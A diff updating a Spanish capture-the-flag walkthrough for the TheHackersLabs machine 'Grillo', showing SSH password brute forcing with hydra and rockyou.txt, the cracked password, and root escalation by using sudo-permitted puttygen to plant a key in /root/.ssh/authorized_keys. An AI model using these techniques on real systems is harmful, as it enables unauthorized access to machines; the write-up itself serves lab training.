@@ -64,6 +64,7 @@ Ingresamos al sitio mediante el navegador accediendo a la IP descubierta en el e
 
 ![Página por defecto](/thl/principiante/grillo/defaul-page.png)
 
+![Comentario](/thl/principiante/grillo/comentario.png)
 
 ---
 
@@ -72,10 +73,12 @@ Ingresamos al sitio mediante el navegador accediendo a la IP descubierta en el e
 Aplicamos fuerza bruta al servicio SSH usando el usuario `melanie` y el diccionario `rockyou.txt`:
 
 ```bash
-hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.3 -F
+hydra -l melanie -P /usr/share/wordlists/rockyou.txt 192.168.100.7 ssh -t 64
 ```
 
 Se encuentra la contraseña válida: **trustno1**
+
+![Hydra](/thl/principiante/grillo/hydra.png)
 
 ---
 
@@ -89,23 +92,31 @@ sudo -l
 
 Descubrimos que podemos ejecutar `puttygen` como root.
 
+![nopasswd](/thl/principiante/grillo/nopasswd.png)
+
 ### Uso de puttygen para escalar
 
 Puttygen se utiliza para generar claves SSH. Generamos una clave para root con los siguientes pasos:
+
+> 💡 *Nota:* Es posible que tengas que crear la carpeta `.ssh` manualmente con `mkdir ~/.ssh` si no existe.
 
 ```bash
 puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id
 puttygen -L ~/.ssh/id >> ~/.ssh/authorized_keys
 sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/id
 sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh
-scp melanie@192.168.1.3:/home/melanie/.ssh/id .
-ssh -i id root@192.168.1.3
+scp melanie@192.168.100.7:/home/melanie/.ssh/id .
+ssh -i id root@192.168.100.7
 ```
+
+Primero, se genera una nueva clave SSH RSA de 2048 bits y se guarda en ~/.ssh/id. Luego, se extrae la clave pública desde ese archivo y se agrega al final de ~/.ssh/authorized_keys para habilitar el acceso por clave. Posteriormente, la clave privada se transfiere al directorio seguro /root/.ssh/, y la pública se exporta en formato OpenSSH a /root/.ssh/authorized_keys, permitiendo así la autenticación como root. Finalmente, se copia la clave privada desde la máquina remota a tu entorno local mediante scp, y se establece la conexión SSH con el usuario root usando:
 
 Con esto obtenemos acceso completo como root.
 
 ---
 
 ## 🎉 ¡Root conseguido!
+
+![root](/thl/principiante/grillo/root.png)
 
 Hemos completado exitosamente la máquina **Grillo** de TheHackersLabs.
